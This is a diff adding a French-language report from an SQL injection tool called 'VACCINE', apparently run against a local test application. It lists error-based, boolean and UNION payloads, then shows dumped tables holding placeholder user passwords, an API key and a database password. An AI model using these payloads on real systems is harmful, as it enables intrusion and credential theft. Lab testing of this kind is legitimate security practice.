@@ -1,0 +1,40 @@
+============================================================
+VACCINE — Rapport d'injection SQL
+============================================================
+
+URL cible        : http://localhost:5000/search?q=1
+Méthode          : GET
+Moteur DB        : SQLite
+Paramètre        : q
+Type injection   : integer
+Nb colonnes      : 4
+Colonne inject.  : 1
+
+Payloads utilisés :
+  - Error-based  : q=1'
+  - Boolean      : q=1 AND 1=1-- -
+  - Union dump   : q=0 UNION SELECT ...
+
+[TABLE] users
+  Colonnes : id | username | password | email
+  Données  :
+    1 | admin | sup3r_s3cr3t | admin@corp.io
+    2 | alice | alice1234 | alice@corp.io
+    3 | bob | b0bpass | bob@corp.io
+    4 | charlie | ch4rlie! | charlie@corp.io
+
+[TABLE] products
+  Colonnes : id | name | price | stock
+  Données  :
+    1 | Laptop | 999.99 | 10
+    2 | Mouse | 19.99 | 50
+    3 | Keyboard | 49.99 | 30
+    4 | Monitor | 299.99 | 8
+
+[TABLE] secrets
+  Colonnes : id | label | value
+  Données  :
+    1 | api_key | sk-XXXX-super-secret-key
+    2 | db_password | root_password_1234
+    3 | internal_url | http://internal-api.corp.io:8080
+
